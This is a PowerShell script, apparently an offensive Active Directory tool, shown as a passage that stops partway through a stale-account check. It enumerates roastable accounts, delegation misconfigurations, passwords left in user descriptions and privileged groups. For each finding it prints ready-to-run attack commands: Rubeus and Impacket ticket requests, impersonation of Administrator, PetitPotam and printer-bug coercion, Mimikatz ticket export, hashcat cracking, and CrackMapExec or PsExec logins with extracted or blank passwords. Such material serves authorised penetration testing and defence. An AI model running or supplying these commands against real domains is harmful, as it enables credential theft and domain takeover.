# AD-Attack-Automator-Enhanced-v3.ps1 - Production Ready with Enhanced Command Logging
# Zero-error, environment-agnostic Active Directory enumeration and attack surface mapping

#Requires -Version 3.0

[CmdletBinding()]
param(
    [switch]$SkipToolCheck,
    [switch]$QuickScan,
    [string]$OutputDir = ".\ADEnum_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
)

# ================================================
# ERROR HANDLING & LOGGING
# ================================================

$ErrorActionPreference = "SilentlyContinue"
$Global:EnumErrors = @()
$Global:ExecutedCommands = @()

function Write-Log {
    param(
        [string]$Message,
        [ValidateSet('Info','Success','Warning','Error','Command','Critical')]
        [string]$Level = 'Info'
    )
    
    $colors = @{
        'Info' = 'Cyan'
        'Success' = 'Green'
        'Warning' = 'Yellow'
        'Error' = 'Red'
        'Command' = 'Magenta'
        'Critical' = 'Red'
    }
    
    $timestamp = Get-Date -Format "HH:mm:ss"
    Write-Host "[$timestamp]" -NoNewline -ForegroundColor Gray
    Write-Host " $Message" -ForegroundColor $colors[$Level]
}

function Log-Command {
    param(
        [string]$Command,
        [string]$Description
    )
    
    $Global:ExecutedCommands += [PSCustomObject]@{
        Time = Get-Date -Format "HH:mm:ss"
        Description = $Description
        Command = $Command
    }
    
    Write-Log "  [CMD] $Command" -Level Command
}

function Invoke-SafeCommand {
    param(
        [scriptblock]$ScriptBlock,
        [string]$ErrorMessage = "Command failed"
    )
    
    try {
        return & $ScriptBlock
    }
    catch {
        $Global:EnumErrors += [PSCustomObject]@{
            Time = Get-Date
            Error = $ErrorMessage
            Details = $_.Exception.Message
        }
        Write-Log "$ErrorMessage : $($_.Exception.Message)" -Level Error
        return $null
    }
}

# ================================================
# ENVIRONMENT DETECTION & VALIDATION
# ================================================

function Test-ADEnvironment {
    Write-Log "Detecting Active Directory environment..." -Level Info
    
    $adInfo = @{
        IsADJoined = $false
        Domain = $null
        DomainController = $null
        Forest = $null
        CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
        IsElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        ComputerName = $env:COMPUTERNAME
        OSVersion = [Environment]::OSVersion.VersionString
    }
    
    # Try multiple methods to detect domain
    Log-Command "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()" "Detecting AD domain using .NET methods"
    
    $methods = @(
        { [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() },
        { Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Domain },
        { $env:USERDNSDOMAIN }
    )
    
    foreach ($method in $methods) {
        $result = Invoke-SafeCommand -ScriptBlock $method
        if ($result) {
            if ($result -is [System.DirectoryServices.ActiveDirectory.Domain]) {
                $adInfo.IsADJoined = $true
                $adInfo.Domain = $result.Name
                $adInfo.Forest = $result.Forest.Name
                $adInfo.DomainController = $result.PdcRoleOwner.Name
                break
            }
            elseif ($result -match '\.') {
                $adInfo.IsADJoined = $true
                $adInfo.Domain = $result
                break
            }
        }
    }
    
    # Try to find DC if not found
    if ($adInfo.IsADJoined -and -not $adInfo.DomainController) {
        $dc = Invoke-SafeCommand -ScriptBlock {
            (Get-WmiObject -Query "SELECT * FROM Win32_NTDomain WHERE DomainName='$($adInfo.Domain)'").DomainControllerName -replace '\\',''
        }
        if ($dc) { $adInfo.DomainController = $dc }
    }
    
    if (-not $adInfo.IsADJoined) {
        Write-Log "Not joined to Active Directory domain. Limited enumeration available." -Level Warning
    }
    else {
        Write-Log "Domain: $($adInfo.Domain) | DC: $($adInfo.DomainController)" -Level Success
    }
    
    return $adInfo
}

# ================================================
# TOOL DETECTION
# ================================================

function Get-AvailableTools {
    if ($SkipToolCheck) {
        return @('Native')
    }
    
    Write-Log "Checking available tools..." -Level Info
    
    $tools = @{
        'Rubeus' = @{ Path = '.\Rubeus.exe'; Test = { Test-Path '.\Rubeus.exe' } }
        'PowerView' = @{ Path = '.\PowerView.ps1'; Test = { Test-Path '.\PowerView.ps1' } }
        'SharpHound' = @{ Path = '.\SharpHound.exe'; Test = { Test-Path '.\SharpHound.exe' } }
        'Mimikatz' = @{ Path = '.\mimikatz.exe'; Test = { Test-Path '.\mimikatz.exe' } }
        'ADModule' = @{ Test = { Get-Module -ListAvailable ActiveDirectory } }
        'Native' = @{ Test = { $true } }
    }
    
    $available = @()
    foreach ($tool in $tools.GetEnumerator()) {
        if (Invoke-SafeCommand -ScriptBlock $tool.Value.Test) {
            $available += $tool.Key
            Write-Log "  [+] $($tool.Key) available" -Level Success
        }
    }
    
    return $available
}

# ================================================
# LDAP QUERY FUNCTIONS
# ================================================

function Get-LDAPSearcher {
    param([string]$Filter, [string[]]$Properties)
    
    try {
        $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = [ADSI]"LDAP://$($domain.Name)"
        $searcher.Filter = $Filter
        $searcher.PageSize = 1000
        
        if ($Properties) {
            $Properties | ForEach-Object { [void]$searcher.PropertiesToLoad.Add($_) }
        }
        
        return $searcher
    }
    catch {
        return $null
    }
}

function Invoke-LDAPQuery {
    param(
        [string]$Filter,
        [string[]]$Properties = @('*')
    )
    
    $searcher = Get-LDAPSearcher -Filter $Filter -Properties $Properties
    if (-not $searcher) { return @() }
    
    try {
        $results = $searcher.FindAll()
        $output = @()
        
        foreach ($result in $results) {
            $obj = @{}
            foreach ($prop in $result.Properties.Keys) {
                $value = $result.Properties[$prop]
                if ($value.Count -eq 1) {
                    $obj[$prop] = $value[0]
                }
                else {
                    $obj[$prop] = @($value)
                }
            }
            $output += [PSCustomObject]$obj
        }
        
        $results.Dispose()
        $searcher.Dispose()
        
        return $output
    }
    catch {
        if ($searcher) { $searcher.Dispose() }
        return @()
    }
}

# ================================================
# NATIVE AD ENUMERATION (NO EXTERNAL TOOLS)
# ================================================

function Get-ASREPRoastableAccounts {
    param([string]$Domain)
    
    Write-Log "  [*] Enumerating AS-REP Roastable accounts..." -Level Info
    
    # UserAccountControl flag for DONT_REQ_PREAUTH is 0x400000 (4194304)
    $filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
    Log-Command "LDAP Filter: $filter" "AS-REP Roasting enumeration using LDAP bitwise filter"
    Log-Command "Get-DomainUser -PreauthNotRequired | Select-Object samaccountname,memberof,description" "PowerView equivalent command"
    
    $properties = @('samaccountname','userprincipalname','pwdlastset','lastlogon','memberof','description','admincount')
    
    $results = Invoke-LDAPQuery -Filter $filter -Properties $properties
    
    $accounts = @()
    foreach ($user in $results) {
        $accounts += [PSCustomObject]@{
            Account = $user.samaccountname
            UPN = $user.userprincipalname
            PwdLastSet = if ($user.pwdlastset) { [DateTime]::FromFileTime($user.pwdlastset) } else { $null }
            LastLogon = if ($user.lastlogon) { [DateTime]::FromFileTime($user.lastlogon) } else { $null }
            Description = $user.description
            IsAdmin = $user.admincount -eq 1
            Groups = if ($user.memberof) { ($user.memberof | ForEach-Object { ($_ -split ',')[0] -replace 'CN=' }) -join '; ' } else { '' }
        }
    }
    
    Write-Log "    Found: $($accounts.Count)" -Level Success
    
    # Print findings directly to screen
    if ($accounts.Count -gt 0) {
        Write-Host "`n  === AS-REP ROASTABLE ACCOUNTS ===" -ForegroundColor Yellow
        foreach ($account in $accounts) {
            Write-Host "  [*] Account: " -NoNewline -ForegroundColor Cyan
            Write-Host $account.Account -ForegroundColor White
            
            # Highlight privileged accounts
            if ($account.IsAdmin -or $account.Groups -match "Domain Admins|Enterprise Admins|Administrators") {
                Write-Host "      [!!!] CRITICAL - PRIVILEGED ACCOUNT DETECTED!" -ForegroundColor Red
                Write-Host "      [!!!] Groups: $($account.Groups)" -ForegroundColor Red
            }
            
            Write-Host "      UPN: $($account.UPN)" -ForegroundColor Gray
            if (-not $account.IsAdmin) {
                Write-Host "      Groups: $($account.Groups)" -ForegroundColor Gray
            }
            Write-Host "      Description: $($account.Description)" -ForegroundColor Gray
            
            # Manual exploitation commands with actual domain
            Write-Host "      [ATTACK] Rubeus: " -NoNewline -ForegroundColor Red
            Write-Host ".\Rubeus.exe asreproast /user:$($account.Account) /format:hashcat /nowrap /outfile:asrep_$($account.Account).hash" -ForegroundColor Yellow
            Write-Host "      [ATTACK] Impacket: " -NoNewline -ForegroundColor Red
            Write-Host "GetNPUsers.py $Domain/$($account.Account) -no-pass -dc-ip <DC_IP>" -ForegroundColor Yellow
            Write-Host "      [ATTACK] Linux: " -NoNewline -ForegroundColor Red
            Write-Host "impacket-GetNPUsers $Domain/$($account.Account) -no-pass -format hashcat -outputfile asrep_$($account.Account).hash" -ForegroundColor Yellow
            Write-Host "      [CRACK] hashcat -m 18200 asrep_$($account.Account).hash wordlist.txt -O" -ForegroundColor Magenta
            Write-Host ""
        }
    }
    
    return $accounts
}

function Get-KerberoastableAccounts {
    param([string]$Domain)
    
    Write-Log "  [*] Enumerating Kerberoastable accounts..." -Level Info
    
    $filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!samaccountname=krbtgt)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
    Log-Command "LDAP Filter: $filter" "Kerberoasting enumeration - accounts with SPNs"
    Log-Command "Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof" "PowerView equivalent command"
    Log-Command "setspn -Q */*" "Windows native SPN enumeration"
    
    $properties = @('samaccountname','serviceprincipalname','pwdlastset','lastlogon','memberof','admincount')
    
    $results = Invoke-LDAPQuery -Filter $filter -Properties $properties
    
    $accounts = @()
    foreach ($user in $results) {
        $accounts += [PSCustomObject]@{
            Account = $user.samaccountname
            SPNs = if ($user.serviceprincipalname) { $user.serviceprincipalname -join ' | ' } else { '' }
            PwdLastSet = if ($user.pwdlastset) { [DateTime]::FromFileTime($user.pwdlastset) } else { $null }
            LastLogon = if ($user.lastlogon) { [DateTime]::FromFileTime($user.lastlogon) } else { $null }
            IsAdmin = $user.admincount -eq 1
            Groups = if ($user.memberof) { ($user.memberof | ForEach-Object { ($_ -split ',')[0] -replace 'CN=' }) -join '; ' } else { '' }
        }
    }
    
    Write-Log "    Found: $($accounts.Count)" -Level Success
    
    # Print findings directly to screen
    if ($accounts.Count -gt 0) {
        Write-Host "`n  === KERBEROASTABLE ACCOUNTS ===" -ForegroundColor Yellow
        foreach ($account in $accounts) {
            Write-Host "  [*] Account: " -NoNewline -ForegroundColor Cyan
            Write-Host $account.Account -ForegroundColor White
            
            if ($account.IsAdmin -or $account.Groups -match "Domain Admins|Enterprise Admins|Administrators") {
                Write-Host "      [!!!] CRITICAL - PRIVILEGED ACCOUNT (AdminCount=1)" -ForegroundColor Red
                Write-Host "      [!!!] Groups: $($account.Groups)" -ForegroundColor Red
            }
            
            Write-Host "      SPNs: $($account.SPNs)" -ForegroundColor Gray
            if (-not $account.IsAdmin) {
                Write-Host "      Groups: $($account.Groups)" -ForegroundColor Gray
            }
            
            # Manual exploitation commands
            Write-Host "      [ATTACK] Rubeus: " -NoNewline -ForegroundColor Red
            Write-Host ".\Rubeus.exe kerberoast /user:$($account.Account) /simple /nowrap /outfile:tgs_$($account.Account).txt" -ForegroundColor Yellow
            Write-Host "      [ATTACK] Impacket: " -NoNewline -ForegroundColor Red
            Write-Host "GetUserSPNs.py $Domain/USER:PASSWORD -dc-ip <DC_IP> -request-user $($account.Account)" -ForegroundColor Yellow
            Write-Host "      [ATTACK] PowerView: " -NoNewline -ForegroundColor Red
            Write-Host "Invoke-Kerberoast -Identity $($account.Account) | fl" -ForegroundColor Yellow
            Write-Host "      [ATTACK] Linux: " -NoNewline -ForegroundColor Red
            Write-Host "impacket-GetUserSPNs $Domain/USER:PASSWORD -request-user $($account.Account) -outputfile tgs_$($account.Account).txt" -ForegroundColor Yellow
            Write-Host "      [CRACK] hashcat -m 13100 tgs_$($account.Account).txt wordlist.txt -O" -ForegroundColor Magenta
            Write-Host ""
        }
    }
    
    return $accounts
}

function Get-UnconstrainedDelegation {
    Write-Log "  [*] Enumerating Unconstrained Delegation..." -Level Info
    
    # TRUSTED_FOR_DELEGATION flag is 0x80000 (524288)
    $filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!primaryGroupID=516))"
    Log-Command "LDAP Filter: $filter" "Unconstrained Delegation - TRUSTED_FOR_DELEGATION flag"
    Log-Command "Get-DomainComputer -Unconstrained | Select-Object name,dnshostname" "PowerView equivalent command"
    Log-Command "Get-ADComputer -Filter {TrustedForDelegation -eq `$true} -Properties TrustedForDelegation" "AD Module equivalent"
    
    $properties = @('name','dnshostname','operatingsystem','lastlogon','serviceprincipalname')
    
    $results = Invoke-LDAPQuery -Filter $filter -Properties $properties
    
    $computers = @()
    foreach ($comp in $results) {
        $computers += [PSCustomObject]@{
            Computer = $comp.name
            DNS = $comp.dnshostname
            OS = $comp.operatingsystem
            LastLogon = if ($comp.lastlogon) { [DateTime]::FromFileTime($comp.lastlogon) } else { $null }
            SPNCount = if ($comp.serviceprincipalname) { $comp.serviceprincipalname.Count } else { 0 }
        }
    }
    
    Write-Log "    Found: $($computers.Count)" -Level Success
    
    # Print findings directly to screen
    if ($computers.Count -gt 0) {
        Write-Host "`n  === UNCONSTRAINED DELEGATION COMPUTERS ===" -ForegroundColor Yellow
        Write-Host "      [!!!] CRITICAL MISCONFIGURATION - CAN CAPTURE DA TICKETS!" -ForegroundColor Red
        foreach ($comp in $computers) {
            Write-Host "  [*] Computer: " -NoNewline -ForegroundColor Cyan
            Write-Host $comp.Computer -ForegroundColor White
            Write-Host "      DNS: $($comp.DNS)" -ForegroundColor Gray
            Write-Host "      OS: $($comp.OS)" -ForegroundColor Gray
            
            # Manual exploitation commands
            Write-Host "      [ATTACK] Monitor for tickets: " -NoNewline -ForegroundColor Red
            Write-Host ".\Rubeus.exe monitor /interval:5 /nowrap" -ForegroundColor Yellow
            Write-Host "      [ATTACK] Printer Bug: " -NoNewline -ForegroundColor Red
            Write-Host ".\SpoolSample.exe <TARGET_DC> $($comp.Computer)" -ForegroundColor Yellow
            Write-Host "      [ATTACK] PetitPotam: " -NoNewline -ForegroundColor Red
            Write-Host "python3 PetitPotam.py <listening_machine> <TARGET_DC>" -ForegroundColor Yellow
            Write-Host "      [ATTACK] Mimikatz dump: " -NoNewline -ForegroundColor Red
            Write-Host "sekurlsa::tickets /export" -ForegroundColor Yellow
            Write-Host ""
        }
    }
    
    return $computers
}

function Get-ConstrainedDelegation {
    Write-Log "  [*] Enumerating Constrained Delegation..." -Level Info
    
    # TRUSTED_TO_AUTH_FOR_DELEGATION flag is 0x1000000 (16777216)
    $filter = "(userAccountControl:1.2.840.113556.1.4.803:=16777216)"
    Log-Command "LDAP Filter: $filter" "Constrained Delegation - TRUSTED_TO_AUTH_FOR_DELEGATION flag"
    Log-Command "Get-DomainUser -TrustedToAuth | Select-Object name,msds-allowedtodelegateto" "PowerView equivalent for users"
    Log-Command "Get-DomainComputer -TrustedToAuth | Select-Object name,msds-allowedtodelegateto" "PowerView equivalent for computers"
    Log-Command "Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne `$null} -Properties msDS-AllowedToDelegateTo" "AD Module equivalent"
    
    $properties = @('name','dnshostname','operatingsystem','msds-allowedtodelegateto','samaccountname')
    
    $results = Invoke-LDAPQuery -Filter $filter -Properties $properties
    
    $accounts = @()
    foreach ($item in $results) {
        $accounts += [PSCustomObject]@{
            Account = if ($item.samaccountname) { $item.samaccountname } else { $item.name }
            DNS = $item.dnshostname
            OS = $item.operatingsystem
            AllowedTo = if ($item.'msds-allowedtodelegateto') { $item.'msds-allowedtodelegateto' -join ' | ' } else { '' }
        }
    }
    
    Write-Log "    Found: $($accounts.Count)" -Level Success
    
    # Print findings directly to screen
    if ($accounts.Count -gt 0) {
        Write-Host "`n  === CONSTRAINED DELEGATION ACCOUNTS ===" -ForegroundColor Yellow
        foreach ($account in $accounts) {
            Write-Host "  [*] Account: " -NoNewline -ForegroundColor Cyan
            Write-Host $account.Account -ForegroundColor White
            Write-Host "      Allowed to delegate to: $($account.AllowedTo)" -ForegroundColor Gray
            
            # Manual exploitation commands
            Write-Host "      [ATTACK] S4U2Self + S4U2Proxy: " -NoNewline -ForegroundColor Red
            Write-Host ".\Rubeus.exe s4u /user:$($account.Account) /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/<target> /ptt" -ForegroundColor Yellow
            Write-Host "      [ATTACK] Impacket: " -NoNewline -ForegroundColor Red
            Write-Host "getST.py -spn <target_spn> -impersonate Administrator DOMAIN/$($account.Account):<password>" -ForegroundColor Yellow
            Write-Host "      [ATTACK] With TGT: " -NoNewline -ForegroundColor Red
            Write-Host ".\Rubeus.exe s4u /user:$($account.Account) /ticket:<base64_tgt> /impersonateuser:Administrator /msdsspn:cifs/<target> /ptt" -ForegroundColor Yellow
            Write-Host ""
        }
    }
    
    return $accounts
}

function Get-RBCDTargets {
    Write-Log "  [*] Enumerating RBCD targets..." -Level Info
    
    $filter = "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
    Log-Command "LDAP Filter: $filter" "Resource-Based Constrained Delegation targets"
    Log-Command "Get-DomainComputer | Where-Object { `$_.'msds-allowedtoactonbehalfofotheridentity' }" "PowerView equivalent command"
    Log-Command "Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Where-Object {`$_.msDS-AllowedToActOnBehalfOfOtherIdentity}" "AD Module equivalent"
    
    $properties = @('name','dnshostname','msds-allowedtoactonbehalfofotheridentity')
    
    $results = Invoke-LDAPQuery -Filter $filter -Properties $properties
    
    $computers = @()
    foreach ($comp in $results) {
        $identity = "Unable to parse"
        if ($comp.'msds-allowedtoactonbehalfofotheridentity') {
            try {
                $sd = New-Object Security.AccessControl.RawSecurityDescriptor($comp.'msds-allowedtoactonbehalfofotheridentity', 0)
                $sids = $sd.DiscretionaryAcl | ForEach-Object { 
                    try { $_.SecurityIdentifier.Translate([Security.Principal.NTAccount]).Value } 
                    catch { $_.SecurityIdentifier.Value }
                }
                $identity = $sids -join ', '
            }
            catch {}
        }
        
        $computers += [PSCustomObject]@{
            Computer = $comp.name
            DNS = $comp.dnshostname
            AllowedPrincipals = $identity
        }
    }
    
    Write-Log "    Found: $($computers.Count)" -Level Success
    
    # Print findings directly to screen
    if ($computers.Count -gt 0) {
        Write-Host "`n  === RBCD CONFIGURED COMPUTERS ===" -ForegroundColor Yellow
        foreach ($comp in $computers) {
            Write-Host "  [*] Computer: " -NoNewline -ForegroundColor Cyan
            Write-Host $comp.Computer -ForegroundColor White
            Write-Host "      Allowed Principals: $($comp.AllowedPrincipals)" -ForegroundColor Gray
            
            # Manual exploitation commands
            Write-Host "      [ATTACK] If you control allowed principal: " -NoNewline -ForegroundColor Red
            Write-Host ".\Rubeus.exe s4u /user:<controlled_user> /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/$($comp.Computer) /ptt" -ForegroundColor Yellow
            Write-Host "      [ATTACK] Add your machine: " -NoNewline -ForegroundColor Red
            Write-Host "Set-ADComputer $($comp.Computer) -PrincipalsAllowedToDelegateToAccount <your_machine>$" -ForegroundColor Yellow
            Write-Host "      [ATTACK] Impacket RBCD: " -NoNewline -ForegroundColor Red
            Write-Host "rbcd.py -delegate-from <controlled_machine>$ -delegate-to $($comp.Computer) -action write DOMAIN/user:password" -ForegroundColor Yellow
            Write-Host ""
        }
    }
    
    return $computers
}

function Get-PasswordInDescription {
    Write-Log "  [*] Checking for passwords in descriptions..." -Level Info
    
    Log-Command "Get-DomainUser * | Select-Object samaccountname,description | Where-Object { `$_.Description -ne `$null }" "PowerView command for enumerating user descriptions"
    Log-Command "Get-ADUser -Filter * -Properties Description | Where-Object {`$_.Description -ne `$null} | Select samaccountname,description" "AD Module equivalent"
    
    $filter = "(&(objectCategory=person)(objectClass=user)(description=*))"
    $properties = @('samaccountname','description','pwdlastset','memberof')
    
    $results = Invoke-LDAPQuery -Filter $filter -Properties $properties
    
    $matches = @()
    $patterns = @('password','pass=','pwd','pw:','cred','p@ss','passw','?????')
    
    foreach ($user in $results) {
        if ($user.description) {
            $desc = $user.description.ToString()
            foreach ($pattern in $patterns) {
                if ($desc -match $pattern) {
                    $matches += [PSCustomObject]@{
                        Account = $user.samaccountname
                        Description = $desc
                        PwdLastSet = if ($user.pwdlastset) { [DateTime]::FromFileTime($user.pwdlastset) } else { $null }
                        Groups = if ($user.memberof) { ($user.memberof | ForEach-Object { ($_ -split ',')[0] -replace 'CN=' }) -join '; ' } else { '' }
                    }
                    break
                }
            }
        }
    }
    
    Write-Log "    Found: $($matches.Count)" -Level Success
    
    # Print findings directly to screen
    if ($matches.Count -gt 0) {
        Write-Host "`n  === PASSWORDS IN DESCRIPTIONS ===" -ForegroundColor Yellow
        foreach ($match in $matches) {
            Write-Host "  [*] Account: " -NoNewline -ForegroundColor Cyan
            Write-Host $match.Account -ForegroundColor White
            Write-Host "      Description: " -NoNewline -ForegroundColor Gray
            Write-Host $match.Description -ForegroundColor Red
            Write-Host "      Groups: $($match.Groups)" -ForegroundColor Gray
            
            # Try to extract password
            if ($match.Description -match '(?:password|pass|pwd|pw)[:\s=]+([^\s,;]+)') {
                $extractedPwd = $matches[1]
                Write-Host "      [!] Possible Password: " -NoNewline -ForegroundColor Red
                Write-Host $extractedPwd -ForegroundColor Yellow
            }
            
            # Manual exploitation commands
            Write-Host "      [ATTACK] Test credential: " -NoNewline -ForegroundColor Red
            Write-Host "net use \\<target>\C$ /user:DOMAIN\$($match.Account) `"<extracted_password>`"" -ForegroundColor Yellow
            Write-Host "      [ATTACK] CrackMapExec: " -NoNewline -ForegroundColor Red
            Write-Host "crackmapexec smb <target> -u $($match.Account) -p '<extracted_password>'" -ForegroundColor Yellow
            Write-Host "      [ATTACK] PSExec: " -NoNewline -ForegroundColor Red
            Write-Host ".\PsExec.exe \\<target> -u DOMAIN\$($match.Account) -p `"<extracted_password>`" cmd" -ForegroundColor Yellow
            Write-Host ""
        }
    }
    
    return $matches
}

function Get-PasswordNotRequired {
    Write-Log "  [*] Checking PASSWD_NOTREQD accounts..." -Level Info
    
    # PASSWD_NOTREQD flag is 0x20 (32)
    $filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
    Log-Command "LDAP Filter: $filter" "PASSWD_NOTREQD enumeration - UACFilter flag 0x20"
    Log-Command "Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol" "PowerView equivalent command"
    Log-Command "Get-ADUser -Filter {UserAccountControl -band 32} -Properties UserAccountControl | Select samaccountname,useraccountcontrol" "AD Module equivalent"
    
    $properties = @('samaccountname','pwdlastset','lastlogon','memberof','useraccountcontrol')
    
    $results = Invoke-LDAPQuery -Filter $filter -Properties $properties
    
    $accounts = @()
    foreach ($user in $results) {
        $accounts += [PSCustomObject]@{
            Account = $user.samaccountname
            PwdLastSet = if ($user.pwdlastset) { [DateTime]::FromFileTime($user.pwdlastset) } else { $null }
            LastLogon = if ($user.lastlogon) { [DateTime]::FromFileTime($user.lastlogon) } else { $null }
            UserAccountControl = $user.useraccountcontrol
            Groups = if ($user.memberof) { ($user.memberof | ForEach-Object { ($_ -split ',')[0] -replace 'CN=' }) -join '; ' } else { '' }
        }
    }
    
    Write-Log "    Found: $($accounts.Count)" -Level Success
    
    # Print findings directly to screen
    if ($accounts.Count -gt 0) {
        Write-Host "`n  === PASSWD_NOTREQD ACCOUNTS ===" -ForegroundColor Yellow
        foreach ($account in $accounts) {
            Write-Host "  [*] Account: " -NoNewline -ForegroundColor Cyan
            Write-Host $account.Account -ForegroundColor White
            Write-Host "      UAC: $($account.UserAccountControl)" -ForegroundColor Gray
            Write-Host "      Groups: $($account.Groups)" -ForegroundColor Gray
            
            # Highlight privileged accounts
            if ($account.Groups -match "Domain Admins|Enterprise Admins|Administrators") {
                Write-Host "      [!!!] CRITICAL - PRIVILEGED ACCOUNT WITH NO PASSWORD REQUIRED!" -ForegroundColor Red
            }
            
            # Manual exploitation commands
            Write-Host "      [ATTACK] Try blank password: " -NoNewline -ForegroundColor Red
            Write-Host "net use \\<target>\C$ /user:DOMAIN\$($account.Account) `"`"" -ForegroundColor Yellow
            Write-Host "      [ATTACK] CrackMapExec: " -NoNewline -ForegroundColor Red
            Write-Host "crackmapexec smb <target> -u $($account.Account) -p ''" -ForegroundColor Yellow
            Write-Host "      [ATTACK] Linux: " -NoNewline -ForegroundColor Red
            Write-Host "smbclient -U $($account.Account)% -L //<target>" -ForegroundColor Yellow
            Write-Host ""
        }
    }
    
    return $accounts
}

function Get-AdminAccounts {
    Write-Log "  [*] Enumerating admin accounts..." -Level Info
    
    $filter = "(&(objectCategory=person)(objectClass=user)(adminCount=1)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
    Log-Command "LDAP Filter: $filter" "Admin accounts with adminCount=1"
    Log-Command "Get-DomainUser -AdminCount | Select-Object samaccountname,memberof" "PowerView equivalent command"
    Log-Command "Get-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount | Select samaccountname" "AD Module equivalent"
    
    $properties = @('samaccountname','lastlogon','pwdlastset','memberof','description')
    
    $results = Invoke-LDAPQuery -Filter $filter -Properties $properties
    
    $accounts = @()
    foreach ($user in $results) {
        $accounts += [PSCustomObject]@{
            Account = $user.samaccountname
            LastLogon = if ($user.lastlogon) { [DateTime]::FromFileTime($user.lastlogon) } else { $null }
            PwdLastSet = if ($user.pwdlastset) { [DateTime]::FromFileTime($user.pwdlastset) } else { $null }
            Description = $user.description
            Groups = if ($user.memberof) { ($user.memberof | ForEach-Object { ($_ -split ',')[0] -replace 'CN=' } | Select-Object -First 5) -join '; ' } else { '' }
        }
    }
    
    Write-Log "    Found: $($accounts.Count)" -Level Success
    
    # Print findings directly to screen
    if ($accounts.Count -gt 0) {
        Write-Host "`n  === ADMIN ACCOUNTS (AdminCount=1) ===" -ForegroundColor Yellow
        Write-Host "      Total privileged accounts: $($accounts.Count)" -ForegroundColor Cyan
        
        # Show top 10 or all if less than 10
        $displayAccounts = if ($accounts.Count -gt 10) { $accounts | Select-Object -First 10 } else { $accounts }
        
        foreach ($account in $displayAccounts) {
            Write-Host "  [*] Account: " -NoNewline -ForegroundColor Cyan
            Write-Host $account.Account -ForegroundColor White
            Write-Host "      Last Logon: $($account.LastLogon)" -ForegroundColor Gray
            Write-Host "      Pwd Last Set: $($account.PwdLastSet)" -ForegroundColor Gray
            Write-Host "      Groups: $($account.Groups)" -ForegroundColor Gray
            if ($account.Description) {
                Write-Host "      Description: $($account.Description)" -ForegroundColor Gray
            }
            Write-Host ""
        }
        
        if ($accounts.Count -gt 10) {
            Write-Host "  ... and $($accounts.Count - 10) more admin accounts (check enumeration data)" -ForegroundColor Gray
            Write-Host ""
        }
    }
    
    return $accounts
}

function Get-PrivilegedGroupMembers {
    Write-Log "  [*] Enumerating privileged groups..." -Level Info
    
    Log-Command "Get-DomainGroupMember 'Domain Admins' | Select-Object MemberName" "PowerView command for group enumeration"
    Log-Command "Get-ADGroupMember 'Domain Admins' | Select Name" "AD Module equivalent"
    
    $privGroups = @(
        'Domain Admins', 'Enterprise Admins', 'Schema Admins', 'Administrators',
        'Account Operators', 'Backup Operators', 'Server Operators', 'Print Operators',
        'DnsAdmins', 'Group Policy Creator Owners', 'Cert Publishers'
    )
    
    $results = @()
    foreach ($groupName in $privGroups) {
        $filter = "(&(objectCategory=group)(cn=$groupName))"
        $group = Invoke-LDAPQuery -Filter $filter -Properties @('distinguishedname','member')
        
        if ($group -and $group.member) {
            $memberCount = if ($group.member -is [Array]) { $group.member.Count } else { 1 }
            $memberNames = $group.member | ForEach-Object { ($_ -split ',')[0] -replace 'CN=' }
            
            $results += [PSCustomObject]@{
                GroupName = $groupName
                MemberCount = $memberCount
                Members = $memberNames -join ', '
            }
        }
    }
    
    Write-Log "    Found: $($results.Count) groups" -Level Success
    
    # Print findings directly to screen
    if ($results.Count -gt 0) {
        Write-Host "`n  === PRIVILEGED GROUPS ===" -ForegroundColor Yellow
        foreach ($group in $results) {
            Write-Host "  [*] Group: " -NoNewline -ForegroundColor Cyan
            Write-Host $group.GroupName -ForegroundColor White
            Write-Host "      Member Count: $($group.MemberCount)" -ForegroundColor Gray
            
            # Truncate member display for large groups
            if ($group.Members.Length -gt 200) {
                Write-Host "      Members: $($group.Members.Substring(0, 200))..." -ForegroundColor Gray
            }
            else {
                Write-Host "      Members: $($group.Members)" -ForegroundColor Gray
            }
            Write-Host ""
        }
        
        # Suggest additional enumeration
        Write-Host "  [INFO] Consider ACL enumeration:" -ForegroundColor Yellow
        Write-Host "         Get-DomainObjectAcl -ResolveGUIDs | ? {`$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner'}" -ForegroundColor Magenta
        Write-Host ""
    }
    
    return $results
}

function Get-StaleAccounts {
    param([int]$Days = 90)
    
    Write-Log "  [*] Checking for stale accounts ($Days+ days)..." -Level Info
    
    Log-Command "Get-DomainUser | Where-Object { `$_.lastlogon -lt (Get-Date).AddDays(-90) }" "PowerView command for stale accounts"
    Log-Command "Search-ADAccount -AccountInactive -TimeSpan 90.00:00:00 -UsersOnly | Select samaccountname,LastLogonDate" "AD Module equivalent"
    
    $cutoff = (Get-Date).AddDays(-$Days).ToFileTime()
    $filter = "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
    $properties = @('samaccountname','lastlogon','pwdlastset')
    
    $results = Invoke-LDAPQuery -Filter $filter -Properties $properties
    
    $stale = @()
